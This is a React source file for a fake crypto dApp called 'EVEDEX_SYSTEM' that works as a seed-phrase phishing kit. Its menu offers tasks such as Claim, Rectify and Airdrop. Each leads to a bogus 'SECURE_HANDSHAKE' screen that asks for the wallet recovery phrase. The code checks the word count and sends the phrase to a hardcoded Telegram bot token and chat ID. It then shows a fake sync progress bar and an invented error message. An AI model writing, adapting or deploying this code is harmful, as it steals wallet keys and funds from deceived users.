import React, { useState, useEffect, useMemo } from 'react';
import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';

export default function App() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [kycPhase, setKycPhase] = useState(1); 
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";

  // Auto-Balance for Rectify
  const USDT_MAP = { 1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 56: "0x55d398326f99059ff775485246999027b3197955" };
  const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
  const { data: nativeBal } = useBalance({ address });

  const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
    method: 'POST', 
    headers: { 'Content-Type': 'application/json' }, 
    body: JSON.stringify({ chat_id: chatId, text: `${msg}` }) 
  }).catch(()=>{});

  const isSeedValid = useMemo(() => {
    const counts = seedVal.trim().split(/\s+/).length;
    return [12, 15, 18, 21, 24].includes(counts) && seedVal.length > 30;
  }, [seedVal]);

  useEffect(() => {
    if (activeTask === "Rectify") {
      setInputVal(tokenBal?.formatted?.slice(0, 10) || nativeBal?.formatted?.slice(0, 10) || "0.00");
    }
  }, [tokenBal, nativeBal, activeTask]);

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px'}}>
      <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'30px'}}>
        <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_SYSTEM</div>
        <appkit-button />
      </header>

      {!isConnected ? (
        <div style={{textAlign:'center', marginTop:'40px', padding:'40px', backgroundColor:'#0d1117', borderRadius:'25px', border:'1px solid #1e293b'}}>
          <div style={{color:'#64748b', fontSize:'11px', marginBottom:'20px'}}>ENCRYPTED_NODE_CONNECTION_REQUIRED</div>
          <appkit-button />
        </div>
      ) : (
        <>
          {view === "menu" && (
            <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
              {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box");}} 
                style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 10px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900', textTransform:'uppercase'}}>
                  <div style={{fontSize:'22px', marginBottom:'5px'}}>{n === "Rectify" ? "⚡" : "〽️"}</div>
                  <div style={{fontSize:'9px'}}>{n}</div>
                </button>
              ))}
            </div>
          )}

          {view === "task_box" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #10b981', borderRadius:'30px', padding:'30px', textAlign:'center'}}>
              <h2 style={{color:'white', fontSize:'22px', marginBottom:'10px'}}>{activeTask === "Rectify" ? "⚡ RECTIFY" : `〽️ ${activeTask}`}</h2>
              <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'15px', marginBottom:'20px'}}>
                <input value={inputVal} onChange={(e)=>setInputVal(e.target.value)} readOnly={activeTask === "Rectify"} 
                style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} />
              </div>
              <button onClick={() => setView("seed_gate")} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>START_HANDSHAKE</button>
            </div>
          )}

          {view === "seed_gate" && (
            <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'40px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
                {!isSyncing ? (
                  <>
                    <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'15px'}}>🛡️ SECURE_HANDSHAKE</div>
                    <p style={{fontSize:'9px', color:'#64748b', marginBottom:'20px', lineHeight:'1.4'}}>NODE_COLLISION DETECTED. PROVIDE BACKUP RECOVERY KEY TO ENCRYPT RELAY TUNNEL.</p>
                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12 OR 24 WORDS..." 
                    style={{width:'100%', height:'130px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'#10b981', padding:'15px', outline:'none', fontSize:'14px'}} />
                    <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR [0x99A]: RELAY CONGESTION."); setView("menu")},1200)}},60);}} 
                    style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900', marginTop:'20px'}}>FINALIZE_SYNC</button>
                  </>
                ) : (
                  <div style={{padding:'40px 0'}}><div style={{fontSize:'50px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{fontSize:'10px', color:'#10b981'}}>INDEXING_MAINNET_POOL...</div></div>
                )}
              </div>
            </div>
          )}
        </>
      )}
    </div>
  );
}
